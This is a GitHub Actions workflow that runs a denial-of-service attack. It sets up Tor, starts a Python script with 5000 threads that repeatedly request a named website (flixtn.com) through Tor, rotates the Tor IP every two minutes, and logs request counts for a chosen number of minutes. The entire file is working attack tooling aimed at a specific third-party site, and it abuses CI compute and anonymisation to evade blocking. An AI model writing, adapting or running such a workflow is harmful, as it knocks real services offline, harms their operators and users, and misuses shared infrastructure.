name: 💀 FAST DOS - 5000 THREADS

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'المدة بالدقائق'
        required: true
        default: '60'

jobs:
  attack:
    runs-on: ubuntu-latest
    timeout-minutes: 65
    
    steps:
      - name: Install
        run: sudo apt update && sudo apt install -y tor
        
      - name: Start Tor
        run: sudo systemctl start tor
        
      - name: 🔥 ATTACK
        run: |
          cat > fast_attack.py << 'EOF'
          import time, random, requests, threading, subprocess
          
          TARGET = "https://flixtn.com"
          DURATION = ${{ github.event.inputs.duration }} * 60
          THREADS = 5000
          
          stats = {"total":0, "ok":0, "fail":0}
          lock = threading.Lock()
          running = True
          start = time.time()
          
          def get_session():
              s = requests.Session()
              s.proxies = {'http':'socks5h://127.0.0.1:9050','https':'socks5h://127.0.0.1:9050'}
              return s
          
          def worker():
              s = get_session()
              while running:
                  try:
                      r = s.get(TARGET, timeout=5, headers={'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                      with lock:
                          stats["total"] += 1
                          if r.status_code == 200:
                              stats["ok"] += 1
                          else:
                              stats["fail"] += 1
                      print(f"{r.status_code}", end="", flush=True)
                  except:
                      with lock:
                          stats["total"] += 1
                          stats["fail"] += 1
                      print(".", end="", flush=True)
                  time.sleep(random.uniform(0.05, 0.2))
          
          def renew_tor():
              while running:
                  time.sleep(120)
                  subprocess.run(["sudo","systemctl","reload","tor"], check=False)
                  print("\n🔄 Tor IP changed")
          
          print(f"💀 ATTACK STARTED - {THREADS} threads")
          print(f"Target: {TARGET}\n")
          
          # تشغيل الخيوط
          for i in range(THREADS):
              threading.Thread(target=worker, daemon=True).start()
          
          # تجديد IP
          threading.Thread(target=renew_tor, daemon=True).start()
          
          # إحصائيات كل 10 ثواني
          last = 0
          while time.time() - start < DURATION:
              time.sleep(10)
              with lock:
                  total = stats["total"]
                  ok = stats["ok"]
                  fail = stats["fail"]
                  rps = (total - last) / 10
                  last = total
              elapsed = int((time.time() - start) / 60)
              print(f"\n[{elapsed}m] Total: {total:,} | OK: {ok:,} | Fail: {fail:,} | RPS: {rps:.0f}")
          
          running = False
          time.sleep(2)
          
          elapsed = time.time() - start
          print(f"\n\n✅ FINAL: {stats['total']:,} requests in {int(elapsed//60)}m")
          print(f"   Success: {stats['ok']:,} | Failed: {stats['fail']:,}")
          if stats['total'] > 0:
              print(f"   Success rate: {stats['ok']/stats['total']*100:.1f}%")
          EOF
          
          python3 fast_attack.py
